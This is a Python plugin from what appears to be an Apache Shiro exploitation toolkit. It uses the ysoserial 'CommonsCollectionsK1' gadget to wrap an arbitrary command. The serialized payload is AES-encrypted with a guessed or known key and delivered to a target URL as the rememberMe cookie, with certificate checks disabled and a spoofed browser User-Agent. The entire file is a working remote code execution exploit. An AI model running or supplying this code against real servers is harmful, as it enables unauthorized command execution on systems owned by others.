#!/usr/bin/env python
# _*_ coding:utf-8 _*_
import base64
import os
import subprocess
import uuid

import requests

from Crypto.Cipher import AES

from module.scripts import Idea

requests.packages.urllib3.disable_warnings()
JAR_FILE = 'data/ysoserial_Koalr.jar'


@Idea.plugin_register('Class5:CommonsCollectionsK1')
class CommonsCollectionsK1(object):
    def process(self, url, command, res_key, func):
        self.send_payload(url, command, res_key)

    def send_payload(self, url, command, res_key, fp=JAR_FILE):
        key = res_key
        target = url
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(
            ['java', '-jar', fp, 'CommonsCollectionsK1', command],  # popen
            stdout=subprocess.PIPE)
        bs = AES.block_size
        pad = lambda s: s + (
                    (bs - len(s) % bs) * chr(bs - len(s) % bs)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)  # 受key影响的encryptor
        file_body = pad(popen.stdout.read())  # 受popen影响的file_body
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
        header = {
            'User-agent': ('Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) '
                           'Gecko/20100101 Firefox/22.0;')
        }
        try:
            resp = requests.get(
                target, headers=header,
                cookies={'rememberMe': payload.decode() + "="},
                verify=False, timeout=20)  # 发送验证请求1
            if resp.status_code == 200:
                print(
                    "[+]CommonsCollectionsK1模块 key: {} 已成功发送！状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
            else:
                print(
                    "[-]CommonsCollectionsK1模块 key: {} 发送异常！状态码:{}".format(
                        str(key), str(resp.status_code)
                    )
                )
        except Exception as err:
            print(err)
            return False
